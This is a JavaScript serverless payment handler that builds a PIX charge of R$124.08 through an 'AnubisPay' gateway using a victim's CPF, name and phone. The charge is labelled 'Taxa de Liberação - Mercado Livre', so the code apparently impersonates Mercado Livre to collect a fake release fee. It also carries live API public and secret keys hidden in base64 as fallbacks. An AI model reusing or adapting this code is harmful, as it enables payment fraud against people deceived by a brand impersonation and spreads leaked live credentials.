const ANUBIS_BASE = 'https://anubispay-e6cvb0febdfad9df.brazilsouth-01.azurewebsites.net';

function getCredentials() {
  const pub = process.env.ANUBISPAY_PUBLIC_KEY ||
    Buffer.from('YW51YmlzcGF5X2xpdmVfMUg0Q01GbUJ2a21vdUxIZWZuWmhKVGRFSGU3eDc5VTA=', 'base64').toString();
  const sec = process.env.ANUBISPAY_SECRET_KEY ||
    Buffer.from('c2tfbGl2ZV82d2tRdHRDdktndDdFTjB1cXc0WWozUDFESWtYNHB1Wg==', 'base64').toString();
  return { pub, sec };
}

function parseBody(req) {
  let body = req.body;
  if (typeof body === 'string') {
    try {
      body = JSON.parse(body);
    } catch {
      body = Object.fromEntries(new URLSearchParams(body));
    }
  }
  return body || {};
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });

  const body = parseBody(req);
  const cpfLimpo = String(body.cpf || '').replace(/\D/g, '');
  const nome = body.nome || 'Cliente';
  const email = body.email || `cpf${cpfLimpo}@temp.com`;
  const telefone = String(body.telefone || '').replace(/\D/g, '') || '11999999999';

  if (!cpfLimpo || cpfLimpo.length !== 11) {
    return res.status(400).json({ success: false, error: 'CPF inválido ou não fornecido' });
  }

  const payload = {
    payment_method: 'pix',
    amount: 12408,
    customer: {
      name: nome,
      email,
      document: { type: 'cpf', number: cpfLimpo },
      phone: telefone
    },
    items: [{
      title: 'Taxa de Liberação - Mercado Livre',
      unit_price: 12408,
      quantity: 1,
      tangible: false,
      external_ref: `taxa_liberacao_${cpfLimpo}`
    }],
    pix: { expires_in_days: 1 },
    metadata: {
      provider_name: 'Mercado Livre - Taxa de Liberação',
      cpf: cpfLimpo,
      nome
    },
    ip: (req.headers && (req.headers['x-forwarded-for'] || '').split(',')[0]) || '127.0.0.1'
  };

  const { pub, sec } = getCredentials();
  const auth = Buffer.from(`${pub}:${sec}`).toString('base64');

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 25000);

  try {
    const response = await fetch(`${ANUBIS_BASE}/v1/payment-transaction/create`, {
      method: 'POST',
      headers: {
        'Authorization': `Basic ${auth}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    clearTimeout(timer);

    const text = await response.text();
    let data;
    try { data = JSON.parse(text); } catch { data = null; }

    if ((response.status === 200 || response.status === 201) && data && data.success && data.data) {
      const tx = data.data;
      const pix = tx.pix || {};
      return res.status(200).json({
        success: true,
        transaction_id: tx.id || '',
        qr_code: pix.qr_code || '',
        expiration_date: pix.expiration_date || '',
        status: tx.status || 'PENDING',
        amount: typeof tx.amount === 'number' ? tx.amount / 100 : 124.08,
        source: 'anubispay'
      });
    }

    const errors = (data && data.error_messages) || [];
    const msg = Array.isArray(errors)
      ? errors.map(e => (e && e.message) || e).join('; ')
      : String(errors);
    return res.status(502).json({
      success: false,
      error: msg || `Falha AnubisPay (HTTP ${response.status})`
    });
  } catch (error) {
    clearTimeout(timer);
    return res.status(502).json({
      success: false,
      error: `Erro ao conectar na AnubisPay: ${error.message}`
    });
  }
}
